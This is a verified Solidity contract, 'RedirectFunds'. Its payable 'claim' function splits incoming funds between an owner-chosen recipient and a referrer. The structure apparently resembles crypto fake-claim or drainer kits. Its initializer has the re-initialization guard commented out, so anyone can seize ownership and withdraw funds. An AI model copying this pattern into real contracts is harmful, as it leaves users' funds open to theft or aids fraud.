/**
 *Submitted for verification at polygonscan.com on 2023-06-05
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

contract RedirectFunds {
    address internal _impl;
    address payable internal _recipient;
    address internal _owner;
    uint256 internal _recipientPercent;
    string internal _CONTACTS;
    string internal _FEATURES;
    //bool private _initialized;

    function initialize(
        address impl,
        address payable recipient,
        address owner,
        uint256 recipientPercent,
        string memory contacts,
        string memory features
    ) public {
        //require(!_initialized, "Contract instance has already been initialized");
        //_initialized = true;

        _impl = impl;
        _recipient = recipient;
        _owner = owner;
        _recipientPercent = recipientPercent;
        _CONTACTS = contacts;
        _FEATURES = features;
    }

function CONTACTS() public view returns (string memory) {
    return _CONTACTS;
}

function FEATURES() public view returns (string memory) {
    return _FEATURES;
}

function recipient() public view returns (address) {
    return _recipient;
}

function owner() public view returns (address) {
    return _owner;
}

function recipientPercent() public view returns (uint256) {
    return _recipientPercent;
}


    function setRecipient(address payable _newRecipient) public {
        require(msg.sender == _owner, "Only owner can change the recipient");
        _recipient = _newRecipient;
    }

    function setRecipientPercent(uint256 _newPercent) public {
        require(msg.sender == _owner, "Only owner can change the percent");
        require(_newPercent <= 100, "Percent cannot be over 100");
        _recipientPercent = _newPercent;
    }

    function claim(address payable _referrer) external payable {
        require(msg.value > 0, "You need to send some Ether");

        //address payable recip = payable(0x37F4afe7b199F9a71Bf6125Ad80DfaEe9456ab01);

        uint256 toRecipient = (msg.value * _recipientPercent) / 100;
        uint256 toReferrer = msg.value - toRecipient;

        _recipient.transfer(toRecipient);
        _referrer.transfer(toReferrer);
    }

    function withdraw(address payable _to) public {
        require(msg.sender == _owner, "Only owner can withdraw");
        _to.transfer(address(this).balance);
    }

    receive() external payable {
    }
}